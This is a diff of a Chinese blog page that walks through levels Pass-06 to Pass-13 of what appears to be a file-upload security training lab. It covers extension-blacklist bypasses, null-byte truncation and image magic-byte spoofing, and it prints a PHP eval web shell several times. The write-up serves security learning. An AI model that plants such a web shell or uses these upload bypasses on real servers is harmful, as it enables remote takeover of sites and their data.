@@ -1197,13 +1197,16 @@
 &lt;p&gt;每一关没有固定的通关方法，大家不要自限思维！&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
-&lt;p&gt;本项目提供的writeup只是起一个参考作用，希望大家可以分享出自己的通关思路。&lt;/p&gt;
+&lt;p&gt;本项目提供的 writeup 只是起一个参考作用，希望大家可以分享出自己的通关思路。&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;实在没有思路时，可以点击查看提示。&lt;/p&gt;
 &lt;/li&gt;
 &lt;li&gt;
 &lt;p&gt;如果黑盒情况下，实在做不出，可以点击查看源码。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Pass-19 必须在 linux 下&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ol&gt;
 &lt;p&gt;&lt;strong&gt;后续:&lt;/strong&gt;&lt;/p&gt;
@@ -1427,9 +1430,216 @@
 &lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_17-49-51.8z6qakaxdl.webp&#34; alt=&#34;PixPin_2025-04-29_17-49-51&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
 &lt;p&gt;上传 &lt;code&gt;.htaccess&lt;/code&gt; 提示“此文件类型不允许上传”&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_18-58-34.4n7x33837l.webp&#34; alt=&#34;PixPin_2025-04-29_18-58-34&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;1、后缀大小写绕过&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;尝试 &lt;strong&gt;后缀大小写绕过&lt;/strong&gt;&lt;/p&gt;
 &lt;p&gt;将 &lt;code&gt;fish.php&lt;/code&gt; 的后缀名修改为 &lt;code&gt;.PhP&lt;/code&gt; 进行上传，上传成功&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_19-02-44.6m43tfiup2.webp&#34; alt=&#34;PixPin_2025-04-29_19-02-44&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;h2&gt;Pass-06&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;pass-06&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#pass-06&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;排除客户端 &lt;code&gt;JavaScript&lt;/code&gt; 检查，上传非图片内容、图片后缀的文件 &lt;code&gt;fish.jpg&lt;/code&gt; 成功，判断为 &lt;strong&gt;检查后缀&lt;/strong&gt; 类型&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_22-59-51.7lk75emt25.webp&#34; alt=&#34;PixPin_2025-04-28_22-59-51&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;上传任意后缀文件 &lt;code&gt;fish.fish&lt;/code&gt; 成功，判断为 &lt;strong&gt;黑名单&lt;/strong&gt; 类型&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_16-18-51.1ovmzfab2l.webp&#34; alt=&#34;PixPin_2025-04-29_16-18-51&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;尝试 &lt;strong&gt;空格绕过&lt;/strong&gt;，上传成功&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-08_20-21-37.2h8iu9eio3.webp&#34; alt=&#34;PixPin_2025-05-08_20-21-37&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;h2&gt;Pass-07&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;pass-07&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#pass-07&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;排除客户端 &lt;code&gt;JavaScript&lt;/code&gt; 检查，上传非图片内容、图片后缀的文件 &lt;code&gt;fish.jpg&lt;/code&gt; 成功，判断为 &lt;strong&gt;检查后缀&lt;/strong&gt; 类型&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_22-59-51.7lk75emt25.webp&#34; alt=&#34;PixPin_2025-04-28_22-59-51&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;上传任意后缀文件 &lt;code&gt;fish.fish&lt;/code&gt; 成功，判断为 &lt;strong&gt;黑名单&lt;/strong&gt; 类型&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_16-18-51.1ovmzfab2l.webp&#34; alt=&#34;PixPin_2025-04-29_16-18-51&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;尝试 &lt;strong&gt;点绕过&lt;/strong&gt;，上传成功&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-08_20-28-19.51ed6wnhtq.webp&#34; alt=&#34;PixPin_2025-05-08_20-28-19&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;h2&gt;Pass-08&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;pass-08&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#pass-08&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;排除客户端 &lt;code&gt;JavaScript&lt;/code&gt; 检查，上传非图片内容、图片后缀的文件 &lt;code&gt;fish.jpg&lt;/code&gt; 成功，判断为 &lt;strong&gt;检查后缀&lt;/strong&gt; 类型&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_22-59-51.7lk75emt25.webp&#34; alt=&#34;PixPin_2025-04-28_22-59-51&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;上传任意后缀文件 &lt;code&gt;fish.fish&lt;/code&gt; 成功，判断为 &lt;strong&gt;黑名单&lt;/strong&gt; 类型&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_16-18-51.1ovmzfab2l.webp&#34; alt=&#34;PixPin_2025-04-29_16-18-51&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;尝试 &lt;strong&gt;::$DATA&lt;/strong&gt; 绕过，上传成功&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_16-21-49.b949ohldd.webp&#34; alt=&#34;PixPin_2025-05-09_16-21-49&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;使用蚁剑进行连接&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_16-27-52.magja8n6.webp&#34; alt=&#34;PixPin_2025-05-09_16-27-52&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;h2&gt;Pass-09&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;pass-09&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#pass-09&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;排除客户端 &lt;code&gt;JavaScript&lt;/code&gt; 检查，上传非图片内容、图片后缀的文件 &lt;code&gt;fish.jpg&lt;/code&gt; 成功，判断为 &lt;strong&gt;检查后缀&lt;/strong&gt; 类型&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_22-59-51.7lk75emt25.webp&#34; alt=&#34;PixPin_2025-04-28_22-59-51&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;上传任意后缀文件 &lt;code&gt;fish.fish&lt;/code&gt; 成功，判断为 &lt;strong&gt;黑名单&lt;/strong&gt; 类型&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_16-18-51.1ovmzfab2l.webp&#34; alt=&#34;PixPin_2025-04-29_16-18-51&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;尝试 &lt;strong&gt;点空格点绕过&lt;/strong&gt;，上传成功&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_16-52-41.969yk8a7oc.webp&#34; alt=&#34;PixPin_2025-05-09_16-52-41&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;使用蚁剑进行连接&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_17-00-12.1sf9bgz0qs.webp&#34; alt=&#34;PixPin_2025-05-09_17-00-12&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;h2&gt;Pass-10&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;pass-10&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#pass-10&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;排除客户端 &lt;code&gt;JavaScript&lt;/code&gt; 检查，上传非图片内容、图片后缀的文件 &lt;code&gt;fish.jpg&lt;/code&gt; 成功，判断为 &lt;strong&gt;检查后缀&lt;/strong&gt; 类型&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_22-59-51.7lk75emt25.webp&#34; alt=&#34;PixPin_2025-04-28_22-59-51&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;上传任意后缀文件 &lt;code&gt;fish.fish&lt;/code&gt; 成功，判断为 &lt;strong&gt;黑名单&lt;/strong&gt; 类型&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-29_16-18-51.1ovmzfab2l.webp&#34; alt=&#34;PixPin_2025-04-29_16-18-51&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;尝试 &lt;strong&gt;后缀双写&lt;/strong&gt;，上传成功&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_17-03-49.26lp2cccua.webp&#34; alt=&#34;PixPin_2025-05-09_17-03-49&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;使用蚁剑进行连接&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_17-00-12.1sf9bgz0qs.webp&#34; alt=&#34;PixPin_2025-05-09_17-00-12&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;h2&gt;Pass-11&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;pass-11&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#pass-11&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;排除客户端 &lt;code&gt;JavaScript&lt;/code&gt; 检查，上传非图片内容、图片后缀的文件 &lt;code&gt;fish.jpg&lt;/code&gt; 成功，判断为 &lt;strong&gt;检查后缀&lt;/strong&gt; 类型&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_22-59-51.7lk75emt25.webp&#34; alt=&#34;PixPin_2025-04-28_22-59-51&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;上传任意后缀文件 &lt;code&gt;fish.fish&lt;/code&gt; 失败，判断为 &lt;strong&gt;白名单&lt;/strong&gt; 类型&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_17-10-29.92qcmj3tx3.webp&#34; alt=&#34;PixPin_2025-05-09_17-10-29&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;div class=&#34;hx-overflow-x-auto hx-mt-6 hx-flex hx-flex-col hx-rounded-lg hx-border hx-py-4 hx-px-4 contrast-more:hx-border-current contrast-more:dark:hx-border-current hx-border-amber-200 hx-bg-amber-100 hx-text-amber-900 dark:hx-border-amber-200/30 dark:hx-bg-amber-900/30 dark:hx-text-amber-200&#34;&gt;
+  &lt;p class=&#34;hx-flex hx-items-center hx-font-medium&#34;&gt;&lt;svg height=16px class=&#34;hx-inline-block hx-align-middle hx-mr-2&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; fill=&#34;none&#34; viewBox=&#34;0 0 24 24&#34; stroke-width=&#34;2&#34; stroke=&#34;currentColor&#34; aria-hidden=&#34;true&#34;&gt;&lt;path stroke-linecap=&#34;round&#34; stroke-linejoin=&#34;round&#34; d=&#34;M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z&#34;/&gt;&lt;/svg&gt;Warning&lt;/p&gt;
+
+  &lt;div class=&#34;hx-w-full hx-min-w-0 hx-leading-7&#34;&gt;
+    &lt;div class=&#34;hx-mt-6 hx-leading-7 first:hx-mt-0&#34;&gt;&lt;p&gt;PHP ≤ 5.3.3 ，&lt;code&gt;php.ini&lt;/code&gt; 配置 &lt;code&gt;magic_quotes_gpc = Off&lt;/code&gt;&lt;/p&gt;&lt;/div&gt;
+  &lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;尝试 &lt;strong&gt;%00 截断&lt;/strong&gt;，上传成功&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_17-43-34.5c171blndq.webp&#34; alt=&#34;PixPin_2025-05-09_17-43-34&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;使用蚁剑进行连接&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_17-45-03.54xz5w1ccb.webp&#34; alt=&#34;PixPin_2025-05-09_17-45-03&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;h2&gt;Pass-12&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;pass-12&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#pass-12&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;排除客户端 &lt;code&gt;JavaScript&lt;/code&gt; 检查，上传非图片内容、图片后缀的文件 &lt;code&gt;fish.jpg&lt;/code&gt; 成功，判断为 &lt;strong&gt;检查后缀&lt;/strong&gt; 类型&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-04-28_22-59-51.7lk75emt25.webp&#34; alt=&#34;PixPin_2025-04-28_22-59-51&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;上传任意后缀文件 &lt;code&gt;fish.fish&lt;/code&gt; 失败，判断为 &lt;strong&gt;白名单&lt;/strong&gt; 类型&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_17-10-29.92qcmj3tx3.webp&#34; alt=&#34;PixPin_2025-05-09_17-10-29&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;尝试 &lt;strong&gt;0x00 截断&lt;/strong&gt; （先使用空格进行占位，再修改为 &lt;code&gt;00&lt;/code&gt;），上传成功&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_17-48-43.esq7heez2.webp&#34; alt=&#34;PixPin_2025-05-09_17-48-43&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_17-49-20.2veymem0rp.webp&#34; alt=&#34;PixPin_2025-05-09_17-49-20&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;使用蚁剑进行连接&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_17-45-03.54xz5w1ccb.webp&#34; alt=&#34;PixPin_2025-05-09_17-45-03&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;h2&gt;Pass-13&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;pass-13&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#pass-13&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;排除客户端 &lt;code&gt;JavaScript&lt;/code&gt; 检查，上传非图片内容、图片后缀的文件 &lt;code&gt;fish.jpg&lt;/code&gt; 失败，判断为 &lt;strong&gt;检查内容&lt;/strong&gt; 类型&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_18-08-18.9o008w0nab.webp&#34; alt=&#34;PixPin_2025-05-09_18-08-18&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;为 &lt;code&gt;fish1.php&lt;/code&gt; 添加 &lt;strong&gt;文件头&lt;/strong&gt;&lt;/p&gt;
+&lt;table&gt;
+  &lt;thead&gt;
+      &lt;tr&gt;
+          &lt;th style=&#34;text-align: left&#34;&gt;Hex 文件签名&lt;/th&gt;
+          &lt;th style=&#34;text-align: center&#34;&gt;ISO 8859-1&lt;/th&gt;
+          &lt;th style=&#34;text-align: center&#34;&gt;文件扩展名&lt;/th&gt;
+      &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;FF D8 FF DB&lt;/code&gt;&lt;br/&gt;&lt;code&gt;FF D8 FF E0 00 10 4A 46 49 46 00 01&lt;/code&gt;&lt;br/&gt;&lt;code&gt;FF D8 FF EE&lt;/code&gt;&lt;br/&gt;&lt;code&gt;FF D8 FF E1 ?? ?? 45 78 69 66 00 00&lt;/code&gt;&lt;br/&gt;&lt;code&gt;FF D8 FF E0&lt;/code&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: center&#34;&gt;&lt;code&gt;ÿØÿÛ&lt;/code&gt;&lt;br/&gt;&lt;code&gt;ÿØÿà␀␐JFIF␀␁&lt;/code&gt;&lt;br/&gt;&lt;code&gt;ÿØÿî&lt;/code&gt;&lt;br/&gt;&lt;code&gt;ÿØÿá??Exif␀␀&lt;/code&gt;&lt;br/&gt;&lt;code&gt;ÿØÿà&lt;/code&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: center&#34;&gt;&lt;code&gt;jpg&lt;/code&gt;&lt;br/&gt;&lt;code&gt;jpeg&lt;/code&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;89 50 4E 47 0D 0A 1A 0A&lt;/code&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: center&#34;&gt;&lt;code&gt;‰PNG␍␊␚␊&lt;/code&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: center&#34;&gt;&lt;code&gt;png&lt;/code&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;47 49 46 38 37 61&lt;/code&gt;&lt;br/&gt;&lt;code&gt;47 49 46 38 39 61&lt;/code&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: center&#34;&gt;&lt;code&gt;GIF87a&lt;/code&gt;&lt;br/&gt;&lt;code&gt;GIF89a&lt;/code&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: center&#34;&gt;&lt;code&gt;gif&lt;/code&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;1、jpg&lt;/p&gt;
+&lt;p&gt;使用 &lt;code&gt;11&lt;/code&gt; 进行占位&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
+
+&lt;div class=&#34;filename not-prose&#34; dir=&#34;auto&#34;&gt;fish2.php&lt;/div&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;11&amp;lt;?php @eval($_POST[&amp;#39;fish&amp;#39;]) ?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-8&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;使用 &lt;code&gt;hexedit&lt;/code&gt; 替换 &lt;code&gt;11&lt;/code&gt; 为 &lt;code&gt;jpg&lt;/code&gt; 文件签名 &lt;code&gt;FF D8&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_18-28-59.7pic38lj4.webp&#34; alt=&#34;PixPin_2025-05-09_18-28-59&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;上传 &lt;code&gt;fish2.php&lt;/code&gt; 成功，利用任意文件包含漏洞使用蚁剑进行连接&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_19-12-29.2veymhle0a.webp&#34; alt=&#34;PixPin_2025-05-09_19-12-29&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;2、png&lt;/p&gt;
+&lt;p&gt;使用 &lt;code&gt;11&lt;/code&gt; 进行占位&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
+
+&lt;div class=&#34;filename not-prose&#34; dir=&#34;auto&#34;&gt;fish3.php&lt;/div&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;11&amp;lt;?php @eval($_POST[&amp;#39;fish&amp;#39;]) ?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-8&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;使用 &lt;code&gt;hexedit&lt;/code&gt; 替换 &lt;code&gt;11&lt;/code&gt; 为 &lt;code&gt;png&lt;/code&gt; 文件签名 &lt;code&gt;89 50&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_19-29-50.icc5atgqa.webp&#34; alt=&#34;PixPin_2025-05-09_19-29-50&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;上传 &lt;code&gt;fish3.php&lt;/code&gt; 成功，利用任意文件包含漏洞使用蚁剑进行连接&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Puppy1599.github.io/picx-images-hosting/Typora/networkSecurity/PixPin_2025-05-09_19-31-07.wirw63qfj.webp&#34; alt=&#34;PixPin_2025-05-09_19-31-07&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;3、gif&lt;/p&gt;
+&lt;p&gt;使用 &lt;code&gt;11&lt;/code&gt; 进行占位&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
+
+&lt;div class=&#34;filename not-prose&#34; dir=&#34;auto&#34;&gt;fish4.php&lt;/div&gt;&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;11&amp;lt;?php @eval($_POST[&amp;#39;fish&amp;#39;]) ?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-8&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;p&gt;使用 &lt;code&gt;hexedit&lt;/code&gt; 替换 &lt;code&gt;11&lt;/code&gt; 为 &lt;code&gt;gif&lt;/code&gt; 文件签名 &lt;code&gt;47 49&lt;/code&gt;&lt;/p&gt;
